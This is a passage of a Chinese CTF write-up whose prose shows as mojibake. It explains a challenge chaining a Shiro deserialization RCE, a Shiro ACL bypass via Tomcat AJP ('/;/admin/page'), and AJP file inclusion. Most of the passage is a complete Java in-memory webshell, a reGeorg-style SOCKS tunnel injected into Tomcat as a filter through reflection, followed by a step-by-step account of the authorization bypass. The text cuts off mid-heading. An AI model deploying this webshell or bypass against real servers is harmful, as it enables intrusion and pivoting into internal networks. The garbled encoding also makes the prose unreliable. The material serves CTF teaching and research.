gadgetä¹Ÿå¾ˆæ–¹ä¾¿ï¼Œè¿™é‡Œç”¨çš„æ˜¯JDK7u21ï¼ˆåœ¨è‡ªå·±åšçš„æ—¶å€™å‘ç°ç»Ÿä¸€ç«¯å£è¯·æ±‚ä¸€æ¬¡jrmpä¹‹åï¼Œåé¢çš„å†ä¸€æ¬¡è¯·æ±‚ä¼šå˜å¾—å¾ˆæ…¢ï¼Œè¿™é‡Œå¯ä»¥é€‰æ‹©å†è·‘ä¸€ä¸ªç«¯å£å‡ºæ¥äº¤æ›¿ä½¿ç”¨ï¼‰ã€‚æ¥ä¸‹æ¥å°±æ˜¯å¸¸è§çš„è¯»å–æ•°æ®åº“è¿æ¥å­—ç¬¦ä¸²æŸ¥ç”¨æˆ·ç™»é™†çš„æ“ä½œäº†ï¼Œåœ¨æ­¤ä¸ç»†è¡¨ã€‚</p><h2 id="Login-Me-Again-shiro-rce-amp-amp-shiro-bypass-aclï¼ˆç™½ç›’ï¼‰"><a href="#Login-Me-Again-shiro-rce-amp-amp-shiro-bypass-aclï¼ˆç™½ç›’ï¼‰" class="headerlink" title="Login Me Again - shiro rce &amp;&amp; shiro bypass aclï¼ˆç™½ç›’ï¼‰"></a>Login Me Again - shiro rce &amp;&amp; shiro bypass aclï¼ˆç™½ç›’ï¼‰</h2><p>è¿™é“é¢˜ï¼Œç”±æˆ‘å’Œ@leixiaoåˆä½œå®Œæˆï¼Œå‰åŠéƒ¨åˆ†shiroä¸å‡ºç½‘rceåˆ©ç”¨ç”±leixiaoè´Ÿè´£å®Œæˆï¼ŒååŠéƒ¨åˆ†shiro bvpass acléƒ¨åˆ†ç”±æˆ‘è´Ÿè´£å®Œæˆã€‚<br>å…ˆè´´ä¸€ä¸ªå½“æ—¶æ„æ€è¿™é“é¢˜æ—¶å€™çš„é€Ÿè®°ï¼ˆæœ‰åˆ æ”¹ï¼‰ï¼š</p><blockquote><p>ç¯å¢ƒï¼šå¤–ç½‘ä¸€ä¸ªæœ‰shiro rceçš„ä¸å‡ºç½‘åº”ç”¨ï¼ˆæ‰“åŒ…æˆjarï¼‰ï¼Œå†…ç½‘æœ‰ä¸€ä¸ªspring+æœ€æ–°ç‰ˆshiroå†™ä¸€ä¸ªåªå…è®¸å›¾çš„ä¸Šä¼ åŠŸèƒ½(æ‰“åŒ…æˆwar)ï¼Œä¸Šä¼ åŠŸèƒ½éœ€è¦ç®¡ç†å‘˜æƒé™ï¼ˆshiroé‰´æƒï¼‰éƒ¨ç½²åœ¨æœ‰ajpæ¼æ´çš„tomcat7ä¸Šã€‚</p></blockquote><blockquote><p>æ”»å‡»æ€è·¯<br>1.é€šè¿‡æ³¨å…¥æœ‰socks5ä»£ç†åŠŸèƒ½çš„webshellä»£ç†åˆ°å†…ç½‘ã€‚<br>2.æ‰¾shiroæ–°çš„æƒé™ç»•è¿‡æ–¹æ³•æˆ–è€…è°·æ­Œæœåˆ°æˆ‘ä¹‹å‰æ‰¾çš„shiro ajpè¶Šæƒï¼š<a href="https://issues.apache.org/jira/browse/SHIRO-760">https://issues.apache.org/jira/browse/SHIRO-760</a>ï¼Œè¶Šæƒä¸Šä¼ æ–‡ä»¶æˆ–è€…ç”¨c0ny1å¸ˆå‚…çš„å§¿åŠ¿ã€‚<br>3.ç”¨ajpæ¼æ´åŒ…å«åˆšæ‰ä¸Šä¼ çš„å›¾ç‰‡rce</p></blockquote><blockquote><p>åˆ©ç”¨éš¾ç‚¹ï¼š1.å¸‚é¢ä¸Šè¿˜æ²¡æœ‰socks5ä»£ç†åŠŸèƒ½çš„æ— æ–‡ä»¶webshellï¼Œéœ€è¦é€‰æ‰‹è‡ªå·±ä»å·²æœ‰çš„jspæ„é€ è½¬æ¢æˆæ— æ–‡ä»¶çš„webshellã€‚2.è‡ªå·±æŒ–è¶Šæƒæˆ–è€…æœåˆ°æˆ‘ä¹‹å‰æäº¤çš„é‚£ä¸ªè¶Šæƒissueæˆ–è€…ç”¨å…¶ä»–åŠæ³•ã€‚3.å¸‚é¢ajpåè®®çš„ä»‹ç»è¾ƒå°‘ï¼Œéœ€è¦é€‰æ‰‹è‡ªå·±ç ”ç©¶å¦‚ä½•ç”¨ajpåè®®ä¸Šä¼ æ–‡ä»¶ã€‚</p></blockquote><p>ä¸‹é¢å°±ä»åˆ©ç”¨éš¾ç‚¹ï¼Œé€ä¸€è¯´æ˜</p><h3 id="æ— æ–‡ä»¶socks5ä»£ç†"><a href="#æ— æ–‡ä»¶socks5ä»£ç†" class="headerlink" title="æ— æ–‡ä»¶socks5ä»£ç†"></a>æ— æ–‡ä»¶socks5ä»£ç†</h3><p>å› ä¸ºè¿™é‡Œæ˜¯shiroï¼Œshiroæœ¬èº«ä¹Ÿæ˜¯ä¸€ä¸ªfilterï¼Œæ‰€ä»¥å†…å­˜é©¬æœ€å¥½ä¹Ÿææˆfilter(ä¼˜å…ˆçº§æœ€é«˜)ï¼Œå†…å­˜é©¬çš„æ€è·¯å¯ä»¥çœ‹åŸºäº<a href="https://mp.weixin.qq.com/s/whOYVsI-AkvUJTeeDWL5dA">Tomcatæ— æ–‡ä»¶Webshellç ”ç©¶</a>ã€‚è‡³äºå…·ä½“filterçš„é€»è¾‘ï¼Œæ”¹ä¸€ä¸‹regå°±å¥½äº†ï¼Œä¸‹é¢è´´ä¸€ä¸‹leixiaoå¸ˆå‚…çš„ä»£ç ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> reGeorg;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.*;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MemReGeorg</span> <span class="keyword">implements</span> <span class="title">javax</span>.<span class="title">servlet</span>.<span class="title">Filter</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> javax.servlet.http.HttpServletRequest request = <span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">private</span> org.apache.catalina.connector.Response response = <span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">private</span> javax.servlet.http.HttpSession session =<span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">init</span><span class="params">(FilterConfig filterConfig)</span> <span class="keyword">throws</span> ServletException </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">destroy</span><span class="params">()</span> </span>&#123;&#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">doFilter</span><span class="params">(ServletRequest request1, ServletResponse response1, FilterChain filterChain)</span> <span class="keyword">throws</span> IOException, ServletException </span>&#123;</span><br><span class="line">        javax.servlet.http.HttpServletRequest request = (javax.servlet.http.HttpServletRequest)request1;</span><br><span class="line">        javax.servlet.http.HttpServletResponse response = (javax.servlet.http.HttpServletResponse)response1;</span><br><span class="line">        javax.servlet.http.HttpSession session = request.getSession();</span><br><span class="line">        String cmd = request.getHeader(<span class="string">"X-CMD"</span>);</span><br><span class="line">        <span class="keyword">if</span> (cmd != <span class="keyword">null</span>) &#123;</span><br><span class="line">            response.setHeader(<span class="string">"X-STATUS"</span>, <span class="string">"OK"</span>);</span><br><span class="line">            <span class="keyword">if</span> (cmd.compareTo(<span class="string">"CONNECT"</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    String target = request.getHeader(<span class="string">"X-TARGET"</span>);</span><br><span class="line">                    <span class="keyword">int</span> port = Integer.parseInt(request.getHeader(<span class="string">"X-PORT"</span>));</span><br><span class="line">                    java.nio.channels.SocketChannel socketChannel = java.nio.channels.SocketChannel.open();</span><br><span class="line">                    socketChannel.connect(<span class="keyword">new</span> java.net.InetSocketAddress(target, port));</span><br><span class="line">                    socketChannel.configureBlocking(<span class="keyword">false</span>);</span><br><span class="line">                    session.setAttribute(<span class="string">"socket"</span>, socketChannel);</span><br><span class="line">                    response.setHeader(<span class="string">"X-STATUS"</span>, <span class="string">"OK"</span>);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (java.net.UnknownHostException e) &#123;</span><br><span class="line">                    response.setHeader(<span class="string">"X-ERROR"</span>, e.getMessage());</span><br><span class="line">                    response.setHeader(<span class="string">"X-STATUS"</span>, <span class="string">"FAIL"</span>);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (java.io.IOException e) &#123;</span><br><span class="line">                    response.setHeader(<span class="string">"X-ERROR"</span>, e.getMessage());</span><br><span class="line">                    response.setHeader(<span class="string">"X-STATUS"</span>, <span class="string">"FAIL"</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (cmd.compareTo(<span class="string">"DISCONNECT"</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">                java.nio.channels.SocketChannel socketChannel = (java.nio.channels.SocketChannel)session.getAttribute(<span class="string">"socket"</span>);</span><br><span class="line">                <span class="keyword">try</span>&#123;</span><br><span class="line">                    socketChannel.socket().close();</span><br><span class="line">                &#125; <span class="keyword">catch</span> (Exception ex) &#123;</span><br><span class="line">                &#125;</span><br><span class="line">                session.invalidate();</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (cmd.compareTo(<span class="string">"READ"</span>) == <span class="number">0</span>)&#123;</span><br><span class="line">                java.nio.channels.SocketChannel socketChannel = (java.nio.channels.SocketChannel)session.getAttribute(<span class="string">"socket"</span>);</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    java.nio.ByteBuffer buf = java.nio.ByteBuffer.allocate(<span class="number">512</span>);</span><br><span class="line">                    <span class="keyword">int</span> bytesRead = socketChannel.read(buf);</span><br><span class="line">                    ServletOutputStream so = response.getOutputStream();</span><br><span class="line">                    <span class="keyword">while</span> (bytesRead &gt; <span class="number">0</span>)&#123;</span><br><span class="line">                        so.write(buf.array(),<span class="number">0</span>,bytesRead);</span><br><span class="line">                        so.flush();</span><br><span class="line">                        buf.clear();</span><br><span class="line">                        bytesRead = socketChannel.read(buf);</span><br><span class="line">                    &#125;</span><br><span class="line">                    response.setHeader(<span class="string">"X-STATUS"</span>, <span class="string">"OK"</span>);</span><br><span class="line">                    so.flush();</span><br><span class="line">                    so.close();</span><br><span class="line">                &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                    response.setHeader(<span class="string">"X-ERROR"</span>, e.getMessage());</span><br><span class="line">                    response.setHeader(<span class="string">"X-STATUS"</span>, <span class="string">"FAIL"</span>);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (cmd.compareTo(<span class="string">"FORWARD"</span>) == <span class="number">0</span>)&#123;</span><br><span class="line">                java.nio.channels.SocketChannel socketChannel = (java.nio.channels.SocketChannel)session.getAttribute(<span class="string">"socket"</span>);</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="keyword">int</span> readlen = request.getContentLength();</span><br><span class="line">                    <span class="keyword">byte</span>[] buff = <span class="keyword">new</span> <span class="keyword">byte</span>[readlen];</span><br><span class="line">                    request.getInputStream().read(buff, <span class="number">0</span>, readlen);</span><br><span class="line">                    java.nio.ByteBuffer buf = java.nio.ByteBuffer.allocate(readlen);</span><br><span class="line">                    buf.clear();</span><br><span class="line">                    buf.put(buff);</span><br><span class="line">                    buf.flip();</span><br><span class="line">                    <span class="keyword">while</span>(buf.hasRemaining()) &#123;</span><br><span class="line">                        socketChannel.write(buf);</span><br><span class="line">                    &#125;</span><br><span class="line">                    response.setHeader(<span class="string">"X-STATUS"</span>, <span class="string">"OK"</span>);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                    response.setHeader(<span class="string">"X-ERROR"</span>, e.getMessage());</span><br><span class="line">                    response.setHeader(<span class="string">"X-STATUS"</span>, <span class="string">"FAIL"</span>);</span><br><span class="line">                    socketChannel.socket().close();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            filterChain.doFilter(request, response);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">equals</span><span class="params">(Object obj)</span> </span>&#123;</span><br><span class="line">        Object[] context=(Object[]) obj;</span><br><span class="line">        <span class="keyword">this</span>.session = (javax.servlet.http.HttpSession ) context[<span class="number">2</span>];</span><br><span class="line">        <span class="keyword">this</span>.response = (org.apache.catalina.connector.Response) context[<span class="number">1</span>];</span><br><span class="line">        <span class="keyword">this</span>.request = (javax.servlet.http.HttpServletRequest) context[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            dynamicAddFilter(<span class="keyword">new</span> MemReGeorg(),<span class="string">"reGeorg"</span>,<span class="string">"/*"</span>,request);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IllegalAccessException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">dynamicAddFilter</span><span class="params">(javax.servlet.Filter filter,String name,String url,javax.servlet.http.HttpServletRequest request)</span> <span class="keyword">throws</span> IllegalAccessException </span>&#123;</span><br><span class="line">        javax.servlet.ServletContext servletContext=request.getServletContext();</span><br><span class="line">        <span class="keyword">if</span> (servletContext.getFilterRegistration(name) == <span class="keyword">null</span>) &#123;</span><br><span class="line">            java.lang.reflect.Field contextField = <span class="keyword">null</span>;</span><br><span class="line">            org.apache.catalina.core.ApplicationContext applicationContext =<span class="keyword">null</span>;</span><br><span class="line">            org.apache.catalina.core.StandardContext standardContext=<span class="keyword">null</span>;</span><br><span class="line">            java.lang.reflect.Field stateField=<span class="keyword">null</span>;</span><br><span class="line">            javax.servlet.FilterRegistration.Dynamic filterRegistration =<span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                contextField=servletContext.getClass().getDeclaredField(<span class="string">"context"</span>);</span><br><span class="line">                contextField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">                applicationContext = (org.apache.catalina.core.ApplicationContext) contextField.get(servletContext);</span><br><span class="line">                contextField=applicationContext.getClass().getDeclaredField(<span class="string">"context"</span>);</span><br><span class="line">                contextField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">                standardContext= (org.apache.catalina.core.StandardContext) contextField.get(applicationContext);</span><br><span class="line">                stateField=org.apache.catalina.util.LifecycleBase.class.getDeclaredField("state");</span><br><span class="line">                stateField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">                stateField.set(standardContext,org.apache.catalina.LifecycleState.STARTING_PREP);</span><br><span class="line">                filterRegistration = servletContext.addFilter(name, filter);</span><br><span class="line">                filterRegistration.addMappingForUrlPatterns(java.util.EnumSet.of(javax.servlet.DispatcherType.REQUEST), <span class="keyword">false</span>,<span class="keyword">new</span> String[]&#123;url&#125;);</span><br><span class="line">                java.lang.reflect.Method filterStartMethod = org.apache.catalina.core.StandardContext.class.getMethod("filterStart");</span><br><span class="line">                filterStartMethod.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">                filterStartMethod.invoke(standardContext, <span class="keyword">null</span>);</span><br><span class="line">                stateField.set(standardContext,org.apache.catalina.LifecycleState.STARTED);</span><br><span class="line">            &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">                ;</span><br><span class="line">            &#125;<span class="keyword">finally</span> &#123;</span><br><span class="line">                stateField.set(standardContext,org.apache.catalina.LifecycleState.STARTED);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="ajpè¶Šæƒçš„shiro-acl"><a href="#ajpè¶Šæƒçš„shiro-acl" class="headerlink" title="ajpè¶Šæƒçš„shiro acl"></a>ajpè¶Šæƒçš„shiro acl</h3><p>è¿™ä¸€ç‚¹åé¢çš„æç¤ºä¹Ÿç»™å‡ºæ¥äº†ï¼Œå¯ä»¥ç”¨<a href="https://gv7.me/articles/2020/how-to-detect-tomcat-ajp-lfi-more-accurately">how-to-detect-tomcat-ajp-lfi-more-accurately</a>æåˆ°çš„åŠæ³•ï¼Œä¹Ÿå¯ä»¥ç”¨æˆ‘ä¹‹å‰æäº¤çš„<a href="https://gv7.me/articles/2020/how-to-detect-tomcat-ajp-lfi-more-accurately">SHIRO-760</a>ã€‚pocåœ¨issueé‡Œé¢å·²ç»ç»™äº†ï¼Œæ¼æ´çš„demoç¯å¢ƒåœ¨<a href="https://github.com/cL0und/srpingboot-shiro">æˆ‘github</a>ä¸Šå¯ä»¥æ‰¾åˆ°ï¼Œè¿™é‡Œå€Ÿè¿™ä¸ªæœºä¼šåˆ†äº«ä¸€ä¸‹å½“æ—¶æŒ–æ˜çš„æ€è·¯ã€‚</p><p>é€šè¿‡åˆ†æ<a href="https://www.freebuf.com/vuls/231909.html">å‰äººçš„æ–‡ç« </a>å¯ä»¥çŸ¥é“ï¼Œæˆ‘ä»¬å¯ä»¥çŸ¥é“åœ¨org.apache.shiro.web.util.WebUtils#getPathWithinApplicationå†…éƒ¨ä¼šå¯¹requestUriè¿›è¡Œæå–å¹¶äº¤ç»™patchMatchesåŒ¹é…ä»¥åˆ¤æ–­æ˜¯å¦éœ€è¦é‰´æƒã€‚<br><img src="1594001505206-b96ba60b-1607-4ff5-91d4-8d7ad1c551f7.png#align=left&display=inline&height=293&margin=%5Bobject%20Object%5D&name=image.png&originHeight=586&originWidth=1492&size=199627&status=done&style=none&width=746" alt="image.png"><br>å¤šæ¬¡æ­¥å…¥åï¼Œå¯ä»¥çœ‹åˆ°å…·ä½“çš„è·å–uriçš„å®ç°æ˜¯å…¶ä¸­çš„getRequestUriã€‚getRequestUrié¦–å…ˆä¼šè·å–javax.servlet.include.request_uriçš„å€¼å¦‚æœè·å–åˆ°äº†å°±ä¸ä¼šè¿›å…¥ <code>if (uri == null)</code> ã€‚<br><img src="1594001525231-a1227a7d-bdc1-477f-8f4c-4f84030bff82.png#align=left&display=inline&height=242&margin=%5Bobject%20Object%5D&name=image.png&originHeight=484&originWidth=1492&size=183925&status=done&style=none&width=746" alt="image.png"><br>è€Œå¦‚æœæœ‰å¸ˆå‚…çœ‹è¿‡shiroä¸Šä¸€æ¬¡å¯¹è¶Šæƒçš„ä¿®å¤çš„è¯ä¼šå‘ç°ï¼Œè¡¥ä¸æ˜¯æ‰“åœ¨<code>if (uri == null)</code>ä¸­çš„ï¼Œé€šè¿‡ajpæ§åˆ¶<code>javax.servlet.include.request_uri</code>ç›¸å½“äºç»•è¿‡ä¸Šä¸€æ¬¡çš„è¡¥ä¸ç‚¹ã€‚<br><img src="1594001543733-534c473f-b23f-47f6-8449-dfc4a8a14f69.png#align=left&display=inline&height=239&margin=%5Bobject%20Object%5D&name=image.png&originHeight=478&originWidth=1492&size=139177&status=done&style=none&width=746" alt="image.png"><br>æ¥ç€è¿™é‡Œæå–å‡ºæ¥çš„uri<code>/;/admin/page</code>ä¼šè¿›å…¥decodeAndCleanUriStringä¸­è¿›è¡Œæ¸…æ´—ã€‚decodeAndCleanUriStringä¼šå–åˆ†å·å‰çš„å†…å®¹è¿”å›ã€‚<br><img src="1594001562448-3aaf5fc7-2aaa-4c45-a01e-990b3ab64cf1.png#align=left&display=inline&height=72&margin=%5Bobject%20Object%5D&name=image.png&originHeight=143&originWidth=1492&size=76386&status=done&style=none&width=746" alt="image.png"><br>åœ¨è¿™é‡Œè¿”å›çš„å°±æ˜¯<code>/</code>ï¼Œåé¢shiroçš„æ­£åˆ™<code>/admin/*</code>è‡ªç„¶ä¹Ÿå°±æ‹¦æˆªä¸äº†ã€‚</p><p>æ­¤å¤–ï¼Œå…‰ç»•è¿‡shiroè¿˜ä¸è¡Œï¼Œspringä¸è§£æè¿™æ¡è·¯ç”±ä¹Ÿæ²¡ç”¨ï¼Œä¸€ä¸ªå¼€å§‹æˆ‘ä¹Ÿä¸ºç”¨å‰äººæ–‡ç« ä¸­çš„ <code>/xxxx;/../</code> å¯ä»¥è½»æ¾ç»•è¿‡ï¼Œé»‘ç›’å‘ç°å¹¶ä¸è¡Œã€‚åˆ†æajpæ¼æ´çš„æ—¶å€™æˆ‘ä»¬çŸ¥é“ï¼Œtomcatå…ˆè°ƒç”¨å¯¹æ‰€æœ‰filterè¿›è¡Œè¿‡æ»¤ç„¶åä¼šè°ƒç”¨å¯¹åº”çš„servletï¼Œè€Œåœ¨springéƒ½æ˜¯ç»Ÿä¸€ç”±DispatcherServletè¿›è¡Œç»Ÿä¸€è°ƒåº¦çš„ã€‚æ‰€ä»¥ä¸€å¼€å§‹æˆ‘é€‰æ‹©æŠŠæ–­ç‚¹æ‰“åˆ°org.springframework.web.servlet.FrameworkServlet#doGetï¼ˆ_DispatcherServletç»§æ‰¿FrameworkServlet_ï¼‰ã€‚åˆå› ä¸ºspringæ˜¯é€šè¿‡HandlerMappingæ¥æ‰¾å¯¹åº”çš„æ§åˆ¶å™¨ï¼Œæ‰€ä»¥æ­¥å…¥æ–­ç‚¹ä¹‹åå°±å¼€å§‹æ‰¾å“ªä¸ªåœ°æ–¹æœ‰è¿™ä¸ªé€»è¾‘ã€‚æœ€ååœ¨/org/springframework/web/servlet/DispatcherServlet.class:484æ‰¾åˆ°ã€‚<br><img src="1594001660546-d8b7972b-9bb0-41cd-9b2c-37aa410d37d6.png#align=left&display=inline&height=391&margin=%5Bobject%20Object%5D&name=image.png&originHeight=782&originWidth=1492&size=329488&status=done&style=none&width=746" alt="image.png"><br>æ­¥å…¥ä¹‹åspringæŠŠå·²ç»æ³¨å†Œè¿‡Mappingè½®è¯¢ä¸€æ¬¡ã€‚åœ¨ä»£ç ä¸­æˆ‘ä»¬ç”¨çš„@GetMappingè¿™é‡Œå°±å¯¹åº”ReuqestMappingHandlerMappingã€‚<br><img src="1594001700248-56346a95-e72b-4a02-a020-7b80d006a673.png#align=left&display=inline&height=411&margin=%5Bobject%20Object%5D&name=image.png&originHeight=822&originWidth=1492&size=243393&status=done&style=none&width=746" alt="image.png"><br>æ­¥å…¥ReuqestMappingHandlerMappingä¹‹åå†å¤šæ¬¡æ­¥å…¥ï¼Œæœ€åæ¥åˆ°org.springframework.web.util.UrlPathHelper#getPathWithinApplication<br><img src="1594001720564-fc1f7a9c-b4ef-40ac-9601-f02cd5a74ee4.png#align=left&display=inline&height=163&margin=%5Bobject%20Object%5D&name=image.png&originHeight=325&originWidth=1492&size=183407&status=done&style=none&width=746" alt="image.png"><br>è¿™é‡Œä¸‰ä¸ªç®­å¤´æ˜¯å…³é”®çš„ä¸‰ä¸ªç‚¹ï¼Œç¬¬ä¸€ä¸ªç®­å¤´ä¼šå¯¹uriæå–å¹¶â€œæ¶ˆæ€â€ï¼Œç¬¬äºŒä¸ªç®­å¤´ä¼šå»pathWithinAppä¸­servletPathä¹‹åçš„å†…å®¹ã€‚ç¬¬ä¸‰ä¸ªç®­å¤´è¿”å›pathäº¤ç»™HandlerMappingåŒ¹é…ã€‚</p><p>æˆ‘ä»¬å…ˆæ¥çœ‹ç¬¬ä¸€ä¸ªç®­å¤´â€œæ¶ˆæ€â€çš„æ­¥éª¤ã€‚<br><img src="1594001748419-fe37e159-a3ac-4b7b-b5e2-2459cd4d7e54.png#align=left&display=inline&height=126&margin=%5Bobject%20Object%5D&name=image.png&originHeight=252&originWidth=1492&size=73032&status=done&style=none&width=746" alt="image.png"><br><img src="1594001754187-5c2a028f-f2c4-4846-9993-167ef84f4c21.png#align=left&display=inline&height=93&margin=%5Bobject%20Object%5D&name=image.png&originHeight=186&originWidth=1492&size=71193&status=done&style=none&width=746" alt="image.png"><br>ä¸Šå›¾removeSemicolonContentä¼šç§»é™¤uriä¸­<code>;</code>ï¼Œ<code>/;/admin/page</code>å˜ä¸º<code>//admin/page</code>ã€‚getSanitizedPathä¼šå¯¹ç§»é™¤é‡å¤çš„<code>/</code>ï¼Œ <code>//admin/page</code> å˜ä¸º <code>/admin/page</code> ï¼ˆ_psï¼šè¿™é‡Œå¹¶ä¸ä¼šå¤„ç†..åŠ.è¿™ä¹Ÿæ˜¯ä¸ºå•¥è€payload /xxx;/../æ— æ³•ç”¨çš„åŸå› ï¼Œè™½ç„¶å¯ä»¥ç»•è¿‡ä½†æ˜¯ä¹‹åspring handlerMappingåŒ¹é…ä¸åˆ°ã€‚_ï¼‰</p><p>å†æ¥ç¬¬äºŒä¸ªç®­å¤´ï¼Œè¿™ä¸ªgetRemainingPathä¼šæå–å¤„Uriä¸­conextPathä¹‹åçš„éƒ¨åˆ†ã€‚ä¸¾ä¸ªåä¾‹å¦‚æœæˆ‘ä»¬æŠŠ<code>javax.servlet.include.servlet_path</code>è®¾ç½®ä¸º<code>/</code>ï¼Œé‚£ä¹ˆè¿”å›ç»™HandlerMappingå°†ä¼šæ˜¯ <code>admin/page</code> ï¼Œè€ŒHandlerMappingåªä¼šåŒ¹é…<code>/admin/page</code>è¿™ä¹Ÿæ˜¯ä¸ºä»€ä¹ˆ<code>javax.servlet.include.servlet_path</code>éœ€è¦ç½®ä¸ºç©ºçš„åŸå› ã€‚</p><p>å›è¿‡å¤´çœ‹æ¼æ´æœ¬è´¨è¿˜æ˜¯åœ¨äºspringå’Œshiroåœ¨è§„èŒƒæ¶ˆæ€urlæ—¶æ ‡å‡†ä¸ä¸€è‡´é€ æˆçš„é—®é¢˜ã€‚å› ä¸ºæœ€æ–°ç‰ˆçš„tomcatå·²ç»é»˜è®¤æŠŠajpå…³äº†ï¼Œå¹¶ä¸”åœ¨åä»£æƒ…å†µä¸‹tomcat 8009ä¹Ÿä¸ä¼šå¯¹å¤–å¼€æ”¾æ‰€ä»¥è¿™ä¸ªæ´çš„åˆ©ç”¨è¿˜æ˜¯å—å¾ˆå¤§é™åˆ¶çš„ã€‚</p><h3 id="ajpä¸Šä¼ æ–‡ä»¶"><a href="#ajpä¸Šä¼ æ–‡ä»¶" class="headerlink" title="ajpä¸Šä¼ æ–‡ä»¶"></a>ajpä¸Šä¼ 